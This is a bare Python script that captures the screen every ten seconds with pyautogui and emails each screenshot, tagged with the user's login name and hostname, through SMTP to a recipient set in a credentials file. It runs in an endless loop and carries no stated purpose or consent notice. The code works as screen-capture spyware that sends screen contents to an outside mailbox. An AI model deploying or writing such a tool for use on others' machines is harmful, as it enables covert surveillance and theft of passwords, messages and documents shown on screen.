import time
import os
import pyautogui
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import json
import socket

# Load credentials from the JSON file
with open("credentials.json", "r") as f:
    credentials = json.load(f)

# Get email credentials
email_config = credentials["email"]
SMTP_SERVER = email_config["smtp_server"]
SMTP_PORT = email_config["smtp_port"]
EMAIL_ACCOUNT = email_config["email_account"]
EMAIL_PASSWORD = email_config["email_password"]
RECIPIENT = email_config["recipient"]

# Get username and hostname
username = os.getlogin()
hostname = socket.gethostname()

# Directory to save screenshots
save_dir = "screenshots"
if not os.path.exists(save_dir):
    os.makedirs(save_dir)

# Function to send email with attachments
def send_email(subject, body, attachment_path):
    try:
        # Create the email
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ACCOUNT
        msg['To'] = RECIPIENT
        msg['Subject'] = f"{subject} {username} {hostname}"  # Include username and hostname
        msg.attach(MIMEText(body, 'plain'))

        # Attach the screenshot
        with open(attachment_path, "rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header(
                "Content-Disposition",
                f"attachment; filename={os.path.basename(attachment_path)}",
            )
            msg.attach(part)

        # Connect to the SMTP server
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(EMAIL_ACCOUNT, EMAIL_PASSWORD)
        server.sendmail(EMAIL_ACCOUNT, RECIPIENT, msg.as_string())
        server.quit()
        print(f"Email sent with screenshot: {attachment_path}")
    except Exception as e:
        print(f"Error sending email: {e}")

# Capture screenshots every 10 seconds and send via email
try:
    while True:
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        screenshot = pyautogui.screenshot()
        file_path = f"{save_dir}/screenshot_{timestamp}.png"
        screenshot.save(file_path)

        # Send the screenshot via email
        send_email("Screenshot Update", "Here is the latest screenshot.", file_path)

        time.sleep(10)
except KeyboardInterrupt:
    print("Screenshot capture stopped.")